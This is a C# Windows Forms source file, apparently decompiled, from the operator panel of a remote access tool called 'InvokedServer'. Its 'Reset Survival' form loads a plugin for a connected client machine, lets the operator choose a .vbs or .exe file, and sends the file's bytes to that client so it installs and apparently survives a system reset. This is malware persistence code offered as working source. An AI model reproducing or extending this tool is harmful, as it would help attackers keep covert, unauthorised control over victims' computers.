

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using InvokedCommon.Messages;
using InvokedServer.Enums;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmResetSurvival : Form
	{
		private bool DidLoadPlugin;
		private readonly Client _connectClient;
		private readonly ResetSurvivalHandler _resetSurvivalHandler;
		private readonly string _windowname = "Reset Survival";
		private static readonly Dictionary<Client, FrmResetSurvival> OpenedForms = new Dictionary<Client, FrmResetSurvival>();
		private string _filePath;

		public static FrmResetSurvival CreateNewOrGetExisting(Client client)
		{
			if (FrmResetSurvival.OpenedForms.ContainsKey(client))
				return FrmResetSurvival.OpenedForms[client];
			FrmResetSurvival newOrGetExisting = new FrmResetSurvival(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmResetSurvival.OpenedForms.Remove(client));
			FrmResetSurvival.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmResetSurvival(Client client)
		{
			this._connectClient = client;
			this._resetSurvivalHandler = new ResetSurvivalHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void FrmResetSurvival_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
			this._resetSurvivalHandler.Dispose();
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			int num = connected ? 1 : 0;
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._resetSurvivalHandler.PluginStatusChanged += new ResetSurvivalHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			this._resetSurvivalHandler.NewLogHandler += new ResetSurvivalHandler.LogHandler(this.ClientAddLog);
			MessageHandler.Register((IMessageProcessor)this._resetSurvivalHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._resetSurvivalHandler);
			this._resetSurvivalHandler.PluginStatusChanged -= new ResetSurvivalHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			this._resetSurvivalHandler.NewLogHandler -= new ResetSurvivalHandler.LogHandler(this.ClientAddLog);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void FrmResetSurvival_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient);
			this.OnResize(EventArgs.Empty);
			this._resetSurvivalHandler.CheckPluginStatus();
		}

		private void ToggleControls(bool value)
		{
			this.InstallBtn.Enabled = value;
			this.FileTextbox.Enabled = value;
			this.FilePathBtn.Enabled = value;
		}

		private void PluginStatusChanged(object sender, PluginStatus status)
		{
			switch (status)
			{
				case PluginStatus.Loaded:
					this.PluginLabel.ForeColor = Color.LightGreen;
					this.PluginLabel.Text = "Plugin is ready!";
					if (!this.DidLoadPlugin)
						this.PluginLabel.Visible = false;
					this.ToggleControls(true);
					break;
				case PluginStatus.Installing:
					this.PluginLabel.ForeColor = Color.DeepSkyBlue;
					this.PluginLabel.Text = "Sending the Plugin for the first time, please wait..";
					this.DidLoadPlugin = true;
					break;
				case PluginStatus.PluginFileNotFound:
					this.PluginLabel.ForeColor = Color.Red;
					this.PluginLabel.Text = "Error: Cannot find the Plugin dll in Plugins folder!";
					break;
			}
			this.OnResize(EventArgs.Empty);
		}

		private void ClientAddLog(object sender, string log) => this.AddLog(log);

		private void AddLog(string log)
		{
			Guna2TextBox logsTextbox = this.LogsTextbox;
			logsTextbox.Text = logsTextbox.Text + log + Environment.NewLine;
		}

		private void ProgramsListBtn_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "VBS files (.vbs)|*.vbs|EXE files (.exe)|*.exe|All Files (*.*)|*.*";
			openFileDialog.FilterIndex = 1;
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
				return;
			this._filePath = openFileDialog.FileName;
			this.FileTextbox.Text = this._filePath;
		}

		private void InstallBtn_Click(object sender, EventArgs e)
		{
			if (this._filePath == null)
			{
				this.AddLog("File path cant be null!");
			}
			else
			{
				this.AddLog("Sending file and checking Installation Status..");
				this.Install();
			}
		}

		private void Install()
		{
			byte[] numArray = File.ReadAllBytes(this._filePath);
			string extension = Path.GetExtension(this._filePath);
			this._connectClient.Send<DoSurvivialInstall>(new DoSurvivialInstall()
			{
				filebytes = numArray,
				filextension = extension
			});
		}
	}
}